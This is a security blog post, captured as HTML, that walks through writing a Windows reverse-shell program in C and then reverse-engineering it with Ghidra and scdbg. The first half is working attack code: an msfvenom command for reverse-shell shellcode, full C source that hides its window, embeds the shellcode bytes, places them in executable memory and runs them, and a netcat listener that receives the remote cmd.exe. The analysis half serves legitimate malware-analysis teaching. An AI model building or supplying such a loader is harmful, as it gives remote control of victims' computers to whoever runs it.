<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.5.1"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Malware 101: Develop and Analyze our own malware" /><meta name="author" content="fareedfauzi" /><meta property="og:locale" content="en_US" /><meta name="description" content="Describe here" /><meta property="og:description" content="Describe here" /><link rel="canonical" href="https://fareedfauzi.github.io/posts/Malware-dev-analysis/" /><meta property="og:url" content="https://fareedfauzi.github.io/posts/Malware-dev-analysis/" /><meta property="og:site_name" content="~/FareedFauzi" /><meta property="og:image" content="https://fareedfauzi.github.io/" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-09-20T08:00:00+08:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://fareedfauzi.github.io/" /><meta property="twitter:title" content="Malware 101: Develop and Analyze our own malware" /><meta name="twitter:site" content="@0xfareed" /><meta name="twitter:creator" content="@fareedfauzi" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Describe here","@type":"BlogPosting","url":"https://fareedfauzi.github.io/posts/Malware-dev-analysis/","headline":"Malware 101: Develop and Analyze our own malware","dateModified":"2021-09-20T08:00:00+08:00","datePublished":"2021-09-20T08:00:00+08:00","image":"https://fareedfauzi.github.io/","mainEntityOfPage":{"@type":"WebPage","@id":"https://fareedfauzi.github.io/posts/Malware-dev-analysis/"},"author":{"@type":"Person","name":"fareedfauzi"},"@context":"https://schema.org"}</script><title>Malware 101: Develop and Analyze our own malware | ~/FareedFauzi</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/img/Profile/profile.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">~/FareedFauzi</a></div><div class="site-subtitle font-italic">Just another cyber-security blog discussing about malware analysis, malware research and reverse engineering</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/fareedfauzi" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/0xfareed" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['fareedradzi','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Malware 101: Develop and Analyze our own malware</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Malware 101: Develop and Analyze our own malware</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Sep 20, 2021, 8:00 AM +0800" > Sep 20 <i class="unloaded">2021-09-20T08:00:00+08:00</i> </span> by <span class="author"> fareedfauzi </span></div><div> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Tue, Sep 21, 2021, 3:10 PM +0800" > Sep 21 <i class="unloaded">2021-09-21T15:10:41+08:00</i> </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="" class="post-preview-img"><p>In this post, we’ll learn together how to write a basic malware program that does a reverse shell connection (using shellcode) and analyze our own compiled malware. We’ll play around with C code using Visual Studio IDE and MSVenom for the creation of the shellcode.</p><h1 id="malware-development">Malware development</h1><h2 id="create-a-new-project-in-visual-studio">Create a new project in Visual Studio</h2><p>We’ll start with creating a new project. Choose the “Console App”. Make sure you choose C++.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://user-images.githubusercontent.com/56353946/134101602-d20f27df-8714-4e1f-b3c9-ee7e0b549ef6.png" alt="image" /></p><p>Name your new project. I’m gonna use “revshell_exe”.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://user-images.githubusercontent.com/56353946/134101656-1e5e23a5-218e-47e2-8a66-046496247a28.png" alt="image" /></p><p>Now, let’s go to our Kali and fire up <code class="language-plaintext highlighter-rouge">msvenom</code> to generate our Windows reverse shell’s shellcode to embed in our malware executable.</p><h2 id="generate-reverse-shells-shellcode-using-msvenom">Generate reverse shell’s shellcode using MSVenom</h2><p>Before we generate a “shellcode”. Some of the beginners might have no idea what does the shellcode means. So, “Shellcode” is a set of instructions that executes a command in software to take control of or exploit a compromised machine. In our case here, our shellcode is to gain the remote system shell of our victim. The shellcode is not only for shell access, instead there’s much other shellcode action that could be done by the author like privilege escalation and many more.</p><p>To generate the shellcode using msvenom, run this command below:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f c
</pre></table></code></div></div><p>Example: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://user-images.githubusercontent.com/56353946/134104090-9e583dc7-1a98-448a-b3b2-cade2e54b17a.png" alt="image" /></p><p>All we need now is to copy the shellcode I highlighted in the red box and paste it into our <code class="language-plaintext highlighter-rouge">main</code> function inside VS IDE.</p><h2 id="coding">Coding</h2><p>When it comes to programming, you need to be familiar with C and WinAPI. Below codes, I’ve put some comments to guide and understand what does the code does.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre><td class="rouge-code"><pre>#include &lt;Windows.h&gt;

int main()
{
    // Run our executable console app in the background
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false);
    
    // MSVenom shellcode payload here
    unsigned char buf[] =
        "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
        "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
        "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
        "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
        "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
        "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
        "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
        "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
        "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
        "\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
        "\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
        "\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
        "\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x00\x80\x68"
        "\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
        "\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2"
        "\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
        "\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44"
        "\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56"
        "\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff"
        "\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
        "\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
        "\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";

    //Allocate memory for the shellcode
    PVOID shellcode = VirtualAlloc(0, sizeof buf, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    //Copies contents of memory block to destination
    RtlCopyMemory(shellcode, buf, sizeof buf);

    //Execute shellcode as new thread
    DWORD threadID;
    HANDLE handleThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode, NULL, 0, &amp;threadID);

    //Wait till thread terminates
    WaitForSingleObject(handleThread, INFINITE);
}
</pre></table></code></div></div><p>If you don’t understand the WinAPI, here is some documentation from Microsoft:</p><ol><li>ShowWindow = <a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">Microsoft documentation link</a><li>VirtualAlloc = <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">Microsoft documentation link</a><li>RtlCopyMemory = <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlcopymemory">Microsoft documentation link</a><li>CreateThread = <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread">Microsoft documentation link</a><li>WaitForSingleObject = <a href="https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject">Microsoft documentation link</a></ol><h2 id="test-out-our-malware">Test out our malware</h2><p>Check for any errors in your code and now we are good to go.</p><p>In our Kali, let’s listen to our reverse shell. In my case, my port will be on 4444.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lvp 4444                                                             
listening on [any] 4444 ...
</pre></table></code></div></div><p>In “Solution Configurations”, change <code class="language-plaintext highlighter-rouge">Debug</code> to <code class="language-plaintext highlighter-rouge">Release</code>. Then, click Run icon.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://user-images.githubusercontent.com/56353946/134106107-ea72aebb-989b-411e-8bc8-1615343f21c1.png" alt="image" /></p><p>After the program executed, our Kali will gain the remote shell cmd.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://user-images.githubusercontent.com/56353946/134106322-be7021e7-b46e-4827-a00b-a4aa78dfd062.png" alt="image" /></p><p>Our shellcode and malware successfully execute.</p><h1 id="malware-analysis-and-reversing">Malware analysis and reversing</h1><p>Now copy your malicious executable from Release folder into your malware analysis lab and start analysing + reversing the program.</p><h2 id="ghidra-analysis">Ghidra analysis</h2><p>The result of decompiler of Ghidra have a slightly changes from our code. This is due to the how compiler compiled our executable and how the Ghidra translate from the assembly code.</p><p>Here the explaination of the decompiled code: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://user-images.githubusercontent.com/56353946/134110659-9ddd86a9-b7c4-41b4-b290-38cd6128b325.png" alt="image" /></p><h2 id="extract-shellcode">Extract shellcode</h2><p>From the decompiler code, we can locate the shellcode in the Ghidra. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://user-images.githubusercontent.com/56353946/134120641-35e9e82b-f9ef-4a72-ac4b-7287fc654362.png" alt="image" /></p><p>This will bring us to the shellcode bytes in the “Listing view”. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://user-images.githubusercontent.com/56353946/134120921-119550ac-b403-4ac9-bb6f-61fa2595368f.png" alt="image" /></p><p>To extract the shellcode, select all the bytes until the finish. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://user-images.githubusercontent.com/56353946/134121249-9c8cb16d-ca5e-44ab-91b2-71f6b94d077f.png" alt="image" /></p><p>Go to Window tab &gt; Bytes: filename.exe. The selected bytes now also been selected in the hex view. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://user-images.githubusercontent.com/56353946/134121356-61fe7c0b-d3df-4ec3-aaf9-6a9cef4774ca.png" alt="image" /></p><p>Copy the bytes and paste into hex editor like HxD. And save it. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://user-images.githubusercontent.com/56353946/134121520-9771cd80-3114-4689-a466-31ae8b9e5211.png" alt="image" /></p><p>Now to analyze the shellcode, there’s some options:</p><ol><li>Use scdbg &lt;– We will use this<li>Use jmp2it<li>Convert the shellcode into executable. And debug the executable using x32dbg.</ol><h2 id="shellcode-analysis">Shellcode analysis</h2><p>The output below of the scdbg for our shellcode is quite helpful. In our case here, the shellcode was easy to be analyzed. At sometimes, a complex shellcode will not be a simpler like this</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://user-images.githubusercontent.com/56353946/134122559-81100c4a-f7a0-4cc4-83fc-23006b87a167.png" alt="image" /></p><p><code class="language-plaintext highlighter-rouge">LoadLibraryA(ws2_32)</code>: First, the process will load the DLL file “ws2_32.dll” using LoadLibrary API.</p><p><code class="language-plaintext highlighter-rouge">WSAStartup(190)</code>: After that, it calls WSAStartup function to initiate the utilization of the Winsock DLL by the current process.</p><p><code class="language-plaintext highlighter-rouge">WSASocket(af=2, tp=1, proto=0, group=0, flags=0)</code>: It then call the WSASocket to creates a socket.</p><p>If we refer the documentation of WSASocket, here the explaination about the number in the prameter:</p><ul><li>af=2 -&gt; The Internet Protocol version 4 (IPv4) address family.<li>tp=1 -&gt; SOCK_STREAM<li>proto=0 -&gt; the service provider will choose the protocol to use<li>group=0 -&gt; No group operation is performed.<li>flags=0 -&gt; A set of flags used to specify additional socket attributes.</ul><p><code class="language-plaintext highlighter-rouge">connect(h=42, host: 192.168.0.128 , port: 4444 ) = 71ab4a07</code>: At this line, the program will establishes a connection to a specific socket. The parameter contains IP of the attacker and his port which will be used to get a reverse shell.</p><p><code class="language-plaintext highlighter-rouge">CreateProcessA( cmd, ) = 0x1269</code>: Our shellcode then executes cmd.exe by calling CreateProcessA API</p><p><code class="language-plaintext highlighter-rouge">WaitForSingleObject(h=1269, ms=ffffffff)</code>: This function will terminate the program when our reverse shell been killed.</p><p><code class="language-plaintext highlighter-rouge">ExitProcess(0)</code>: Exit and terminate current process.</p><h1 id="sum-up">Sum up</h1><p>In the conclusion, we can see that the malware first will be run in the background. And then it allocates some memory space for our shellcode. After allocating the memory region, our shellcode is then being copy to the allocated memory. Then, it uses CreateThread API to execute the shellcode. In the shellcode, it will connect to our IP and port to gain the reverse shell of cmd.exe.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/blog/'>Blog</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/malware-analysis/" class="post-tag no-text-decoration" >Malware Analysis</a> <a href="/tags/malware-development/" class="post-tag no-text-decoration" >Malware Development</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Malware 101: Develop and Analyze our own malware - ~/FareedFauzi&url=https://fareedfauzi.github.io/posts/Malware-dev-analysis/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Malware 101: Develop and Analyze our own malware - ~/FareedFauzi&u=https://fareedfauzi.github.io/posts/Malware-dev-analysis/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Malware 101: Develop and Analyze our own malware - ~/FareedFauzi&url=https://fareedfauzi.github.io/posts/Malware-dev-analysis/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Malware-dev-analysis/">Malware 101: Develop and Analyze our own malware</a><li><a href="/posts/Understanding-Powershell/">Powershell: Understanding the complexity behind it</a><li><a href="/posts/Deobfuscate-Powershell/">Powershell script: An easy way to deobfuscate it!</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/fileless/">Fileless</a> <a class="post-tag" href="/tags/powershell/">Powershell</a> <a class="post-tag" href="/tags/malicious-document/">Malicious Document</a> <a class="post-tag" href="/tags/malware-analysis/">Malware Analysis</a> <a class="post-tag" href="/tags/malware-development/">Malware Development</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Deobfuscate-Powershell/"><div class="card-body"> <span class="timeago small" > Feb 6 <i class="unloaded">2021-02-06T08:06:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Powershell script: An easy way to deobfuscate it!</h3><div class="text-muted small"><p> I came across a fileless malware called Lemon-Duck crypto miner during our (my officemate and I) investigation on suspicious communication in our client network. This malware completely leveraging ...</p></div></div></a></div><div class="card"> <a href="/posts/Maldoc-Cheatsheet/"><div class="card-body"> <span class="timeago small" > Jan 6 <i class="unloaded">2021-01-06T08:06:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Malicious Document: Cheatsheet and Note</h3><div class="text-muted small"><p> RTF RTF often comes with exploits targetting Microsoft Word vulnerabilities. Always look for embedded objects and anomalous content in the RTF. Be prepared to locate, extract and analyze shellcod...</p></div></div></a></div><div class="card"> <a href="/posts/Understanding-Powershell/"><div class="card-body"> <span class="timeago small" > May 11, 2020 <i class="unloaded">2020-05-11T08:06:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Powershell: Understanding the complexity behind it</h3><div class="text-muted small"><p> PowerShell attacks are currently the popular weapon of alternative for several of those attacks as a result of it provides variety of techniques for bypassing existing security. Not least of all, t...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Deobfuscate-Powershell/" class="btn btn-outline-primary"><p>Powershell script: An easy way to deobfuscate it!</p></a> <span class="btn btn-outline-primary disabled"><p>-</p></span></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/0xfareed">fareedfauzi</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/fileless/">Fileless</a> <a class="post-tag" href="/tags/powershell/">Powershell</a> <a class="post-tag" href="/tags/malicious-document/">Malicious Document</a> <a class="post-tag" href="/tags/malware-analysis/">Malware Analysis</a> <a class="post-tag" href="/tags/malware-development/">Malware Development</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://fareedfauzi.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i 